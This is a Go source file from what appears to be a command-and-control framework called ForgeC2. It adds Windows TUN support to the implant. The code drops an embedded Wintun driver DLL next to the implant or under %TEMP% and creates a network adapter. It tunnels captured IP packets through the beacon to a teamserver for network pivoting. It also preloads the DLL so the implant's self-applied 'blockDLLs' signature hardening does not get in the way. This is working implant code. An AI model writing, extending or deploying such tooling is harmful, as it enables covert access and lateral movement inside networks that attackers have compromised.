//go:build windows && wintun

package main

import (
	"bytes"
	"errors"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"

	"golang.org/x/sys/windows"
	"golang.zx2c4.com/wintun"
)

// Windows TUN support. The graft carries the signed Wintun runtime embedded
// per architecture (see tun_wintun_amd64.go / tun_wintun_arm64.go), staged by
// scripts/fetch-wintun.{ps1,sh}; this file implements the same
// startAgentTUN/stopAgentTUN/tunWritePacket contract as tun_linux.go, so the
// task layer and the tun_data framing on the beacon stay shared.
//
// Everything here compiles only with `-tags wintun`, which the generator adds
// solely when the per-arch runtime is staged in the build tree; without it,
// tun_stub.go keeps reporting the honest "no bundled Wintun" error.
const (
	// wintunAdapterName mirrors the Linux interface name (fc2tun0).
	wintunAdapterName = "fc2tun0"
	// wintunTunnelType is the cosmetic adapter description shown by Windows.
	wintunTunnelType = "ForgeC2"
	// wintunRingCapacity is the session ring size (4 MiB, wireguard-go's default).
	wintunRingCapacity = 0x400000
	// wintunStopWaitMillis bounds the read-loop wait so stopAgentTUN cannot
	// leave the goroutine parked on the session event indefinitely.
	wintunStopWaitMillis = 500
)

// wintunAdapterGUID pins the adapter's NLA identity: a stable GUID makes
// repeated start/stop cycles reuse one network profile instead of stacking a
// new "unidentified network" entry per run.
var wintunAdapterGUID = windows.GUID{
	Data1: 0x22fc2a1c,
	Data2: 0x00f5,
	Data3: 0x4c2f,
	Data4: [8]byte{0x8a, 0x9c, 0x21, 0x9d, 0x22, 0x44, 0x3c, 0x01},
}

var (
	wintunMu      sync.Mutex
	wintunAdapter *wintun.Adapter
	wintunSess    wintun.Session
	wintunUp      bool
	wintunStop    atomic.Bool
)

// wintunElevationHint appends the actionable reason when the adapter could not
// be created because the process is not elevated. WintunCreateAdapter installs
// the signed driver on first use, which the kernel requires an administrator
// token for (ERROR_ACCESS_DENIED, or ERROR_ELEVATION_REQUIRED when the service
// control manager refuses first).
func wintunElevationHint(err error) string {
	var errno syscall.Errno
	if errors.As(err, &errno) && (errno == windows.ERROR_ACCESS_DENIED || errno == windows.ERROR_ELEVATION_REQUIRED) {
		return " (creating a Wintun adapter needs an elevated/administrator context)"
	}
	return ""
}

func startAgentTUN(cidr string) (string, error) {
	ip, ipnet, err := net.ParseCIDR(strings.TrimSpace(cidr))
	if err != nil {
		return "", fmt.Errorf("tun_start: invalid CIDR %q: %w", cidr, err)
	}
	if ip.To4() == nil {
		return "", fmt.Errorf("tun_start: the Windows TUN supports IPv4 CIDRs only (got %q)", cidr)
	}
	if err := stageWintunDLL(wintunDLLBytes); err != nil {
		return "", fmt.Errorf("tun_start: %w", err)
	}
	adapter, err := wintun.CreateAdapter(wintunAdapterName, wintunTunnelType, &wintunAdapterGUID)
	if err != nil {
		return "", fmt.Errorf("tun_start: create Wintun adapter: %w%s", err, wintunElevationHint(err))
	}
	session, err := adapter.StartSession(wintunRingCapacity)
	if err != nil {
		_ = adapter.Close()
		return "", fmt.Errorf("tun_start: start Wintun session: %w", err)
	}
	warning := wintunConfigureIPv4(wintunAdapterName, ip, ipnet)
	wintunMu.Lock()
	wintunAdapter = adapter
	wintunSess = session
	wintunUp = true
	wintunMu.Unlock()
	wintunStop.Store(false)
	go wintunReadLoop(session)
	socksEnqueueOut(0, "tun_up", []byte(wintunAdapterName+" "+cidr))
	msg := fmt.Sprintf("tun %s up addr=%s (packets framed over beacon as tun_data; pair with teamserver UDP helper)", wintunAdapterName, ip.String())
	if warning != "" {
		msg += " (warning: " + warning + ")"
	}
	return msg, nil
}

func stopAgentTUN() error {
	wintunStop.Store(true)
	wintunMu.Lock()
	adapter, session, up := wintunAdapter, wintunSess, wintunUp
	wintunAdapter, wintunSess, wintunUp = nil, wintun.Session{}, false
	wintunMu.Unlock()
	if up {
		session.End()
		if adapter != nil {
			// Closing the adapter removes it; Wintun keeps the driver
			// installed until its last adapter goes away.
			_ = adapter.Close()
		}
	}
	socksEnqueueOut(0, "tun_down", nil)
	return nil
}

// tunEnqueue queues one captured TUN packet for the next beacon (a tun_data
// frame; plain bytes over the socks frame queue, no envelope needed). The
// Linux implementation carries its own copy in tun_linux.go so neither build
// constraint set ever sees an unused helper.
func tunEnqueue(pkt []byte) {
	socksEnqueueOut(0, "tun_data", pkt)
}

// wintunReadLoop drains captured IP packets into the beacon's tun_data queue.
// The packet slice points into the session ring, so it is copied before being
// released for reuse.
func wintunReadLoop(session wintun.Session) {
	event := session.ReadWaitEvent()
	for {
		pkt, err := session.ReceivePacket()
		if err != nil {
			if !errors.Is(err, windows.ERROR_NO_MORE_ITEMS) {
				return // session ended or the ring failed
			}
			if wintunStop.Load() {
				return
			}
			// The bound keeps teardown deterministic even when the stop
			// flag races the session event.
			if _, werr := windows.WaitForSingleObject(event, wintunStopWaitMillis); werr != nil {
				return
			}
			continue
		}
		if len(pkt) == 0 {
			continue
		}
		data := make([]byte, len(pkt))
		copy(data, pkt)
		session.ReleaseReceivePacket(pkt)
		tunEnqueue(data)
	}
}

func tunWritePacket(pkt []byte) {
	if len(pkt) == 0 {
		return
	}
	wintunMu.Lock()
	up := wintunUp
	session := wintunSess
	wintunMu.Unlock()
	if !up {
		return
	}
	buf, err := session.AllocateSendPacket(len(pkt))
	if err != nil {
		return // ring full: drop, mirroring the Linux write path's best-effort semantics
	}
	copy(buf, pkt)
	session.SendPacket(buf)
}

// wintunConfigureIPv4 assigns the requested CIDR to the adapter with netsh
// (mirroring the Linux implementation's use of the `ip` tool) and returns a
// non-empty warning when the address could not be applied: the TUN stays up
// for a manual configuration, so this must not tear the session down.
func wintunConfigureIPv4(name string, ip net.IP, ipnet *net.IPNet) string {
	mask := net.IP(ipnet.Mask).String()
	out, err := exec.Command("netsh", "interface", "ipv4", "set", "address",
		"name="+name, "static", ip.String(), mask).CombinedOutput()
	if err == nil {
		return ""
	}
	return fmt.Sprintf("netsh address config failed (%v): %s", err, strings.TrimSpace(string(out)))
}

// stageWintunDLL writes the embedded runtime next to the running executable so
// the binding's LoadLibraryEx("wintun.dll", ..., APPLICATION_DIR|SYSTEM32)
// finds it: the application directory is the only search path the upstream
// binding uses. When the executable's directory is not writable, the runtime
// is staged under %TEMP% and pre-loaded explicitly; Windows resolves later
// same-basename loads to the already-loaded image, so the binding still binds
// to it.
func stageWintunDLL(data []byte) error {
	if len(data) == 0 {
		return fmt.Errorf("this implant carries no Wintun runtime for windows/%s", runtime.GOARCH)
	}
	exe, err := os.Executable()
	if err != nil {
		return fmt.Errorf("locate the executable for Wintun staging: %w", err)
	}
	target := filepath.Join(filepath.Dir(exe), "wintun.dll")
	if current, rerr := os.ReadFile(target); rerr == nil && bytes.Equal(current, data) {
		return nil // already staged by an earlier start
	}
	if werr := os.WriteFile(target, data, 0600); werr == nil {
		return nil
	}
	tmp := filepath.Join(os.TempDir(), "forgec2-wintun")
	if err := os.MkdirAll(tmp, 0700); err != nil {
		return fmt.Errorf("stage Wintun next to the implant failed and %s is unusable: %w", tmp, err)
	}
	dll := filepath.Join(tmp, "wintun.dll")
	if err := os.WriteFile(dll, data, 0600); err != nil {
		return fmt.Errorf("stage Wintun runtime: %w", err)
	}
	if err := preloadWintunDLL(dll); err != nil {
		return fmt.Errorf("the implant directory is not writable and pre-loading %s failed: %w", dll, err)
	}
	return nil
}

// preloadWintunDLL loads the runtime by full path and deliberately keeps it
// loaded (no FreeLibrary): the binding's later LoadLibraryEx("wintun.dll")
// resolves to the loaded module by base name instead of searching disk.
func preloadWintunDLL(path string) error {
	h, err := windows.LoadLibraryEx(path, 0, windows.LOAD_LIBRARY_SEARCH_DLL_LOAD_DIR|windows.LOAD_LIBRARY_SEARCH_SYSTEM32)
	if err != nil {
		return err
	}
	_ = h // kept loaded for the life of the process
	return nil
}

// preloadWintunBeforeHardening loads the embedded runtime ahead of the
// MicrosoftSignedOnly signature policy that blockDLLs() is about to apply (see
// its call site): once that policy is active the loader refuses any fresh
// non-Microsoft-signed image — wintun.dll is WireGuard LLC-signed — with
// ERROR_INVALID_IMAGE_HASH, so the lazy staging at tun_start time could never
// succeed on a hardened implant. Staging plus one binding call (Version()
// forces the binding's LoadLibraryEx and caches the module handle) done here
// keeps the lazy path working afterwards. Failures are tolerated silently: a
// host without a writable staging location keeps the honest tun_start error.
func preloadWintunBeforeHardening() {
	if len(wintunDLLBytes) == 0 {
		return
	}
	if err := stageWintunDLL(wintunDLLBytes); err != nil {
		return
	}
	if v := wintun.Version(); v == "" || v == "unknown" {
		logDebug("[tun] wintun preload before signature hardening did not bind")
	}
}
